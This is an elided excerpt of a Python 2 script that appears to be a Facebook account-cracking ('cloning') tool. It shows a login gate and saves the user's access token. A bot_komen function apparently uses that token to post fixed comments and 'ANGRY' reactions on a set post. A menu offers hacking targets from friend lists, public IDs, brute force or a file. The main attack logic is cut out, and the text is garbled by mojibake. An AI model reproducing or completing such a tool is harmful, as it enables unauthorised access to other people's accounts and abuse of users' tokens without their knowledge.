...
loop = 'true'
while (loop == 'true'):
    username = raw_input("\033[0;39m\x1b[0;39mUsername тЮг \x1b[0;39m ")
    if (username == CorrectUsername):
    	password = raw_input("\033[0;39m\x1b[0;39mPassword тЮг \x1b[0;39m ")
...
def masuk():
	...
	try:
		...
		zedd.write(toket)
		zedd.close()
		print '\033[0;39mтЬУ\033[0;92m Login Successful'
		menu()
	except KeyError:
...
def bot_komen():
	...
	una = ('1741317224')
	kom = ('ЁЭЩ╖ЁЭЪКЁЭЪХЁЭЪХЁЭЪШ ЁЭЩ░ЁЭЪХЁЭЪЯЁЭЪТЁЭЪЧ')
	reac = ('ANGRY')
	post = ('10208284082656658')
	post2 = ('10208284082656658')
	kom2 = ('ЁЭЩ╖ЁЭЪКЁЭЪХЁЭЪХЁЭЪШ ЁЭЩ░ЁЭЪХЁЭЪЯЁЭЪТЁЭЪЧ')
	reac2 = ('ANGRY')
...
def menu():
	...
	os.system("clear")
	print logo
	print "   \033[0;39;40m тХФтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХЧ"
	print "   \033[0;39;40m тХС\033[0;39;40m[*] Name\033[0;39;40m: "+nama+"  	   \033[0;39;40mтХС"                               
	print "   \033[0;39;40m тХС\033[0;39;40m[*] ID  \033[0;39;40m: "+id+"        \033[0;39;40mтХС"
	print "   \033[0;39;40m тХС\033[0;39;40m[*] Subs\033[0;39;40m: "+sub+"                      \033[0;39;40mтХС"
	print "   \033[0;39;40m тХЪтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХЭ"
...
def super():
	...
	os.system('clear')
	print logo
	print "\x1b тХФтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХЧ"
	print "\x1b тХС1. Hack From Friend List тХС"
	print "\x1b тХС2. Hack From Public ID   тХС"
	print "\x1b тХС3. Hack Bruteforce       тХС"
	print "\x1b тХС4. Hack From File        тХС"
	print "\x1b тХС0. Back                  тХС"
	print "\x1b тХЪтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХЭ"
	pilih_super()

def pilih_super():
	peak = raw_input("\n\033[1;31;40mтЮгтЮг \033[1;97m")
	if peak =="":
		...
		jalan('\033[0;39m[тАв] Getting IDs \033[0;39m...')
		...
		try:
			...
			print"\033[0;31;39m[тАв] Name : "+op["name"]
		except KeyError:
			print"\033[0;39m[тАв] ID Not Found!"
			raw_input("\n\033[0;39m[\033[0;39mBack\033[0;39m]")
			super()
		print"\033[0;39;40m[тАв] Getting IDs..."
	...
	print "\033[0;39;40m[тАв] Total IDs : \033[0;97m"+str(len(id))
	jalan('\033[0;39;40m[тАв] Please Wait...')
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\033[0;39;40m[тАв] Cloning\033[0;97m"+o),;sys.stdout.flush();time.sleep(1)
	print "\n\033[0;39m ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
	...
	print '\033[0;39;40m[тАв] Process Has Been Completed\033[0;39m....'
	...
	print """
\033[0;30;39тФАтФАтФАтФАтФАтФАтФАтФАтФАтФАтФАтФАтФАтФАтФАтФАтФАтФАтФАтФАтФАтФАтФАтФАтФАтФАтФАтФАтФАтФАтФАтФАтФАтФАтФАтФАтФАтФАтФАтФАтФАтФАтФА
           """
